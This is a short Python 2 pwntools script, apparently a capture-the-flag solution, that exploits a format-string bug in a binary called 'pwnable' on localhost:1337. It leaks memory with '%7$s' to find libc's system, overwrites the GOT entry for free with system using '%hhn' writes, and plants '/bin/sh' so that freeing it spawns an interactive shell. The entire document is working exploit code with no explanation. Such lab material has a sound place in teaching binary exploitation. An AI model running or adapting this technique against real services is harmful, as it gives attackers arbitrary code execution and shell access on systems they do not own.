from pwn import *

#r = process("./pwnable")
r = remote("localhost", 1337)
r.sendlineafter("What's your name?", "/bin/sh")

def printf(s):
    r.sendlineafter("Write me something and I will printf it for you!\n", s)

@MemLeak
def leak(addr):
    if "\x00" in p32(addr): return "\x7f"
    printf(p32(addr) + "BEGIN%7$sEND");
    r.recvuntil("BEGIN")
    data = r.recvuntil("END", drop=True) + "\x00"
    return data

def www(where, what):
    print "Writing '%s' at 0x%x" % (what.encode("hex"), where)
    for off, b in enumerate(ordlist(what)):
        printf(("%%%dc%%11$hhn" % b).ljust(16) + p32(where+off))

e = ELF("./pwnable")
d = DynELF(leak, elf=e)

system = d.lookup("system", "libc.so")

print "Address of system in libc: 0x%x" % system

www(e.got["free"], p32(system))

r.sendline("quit")
r.clean()
r.interactive()
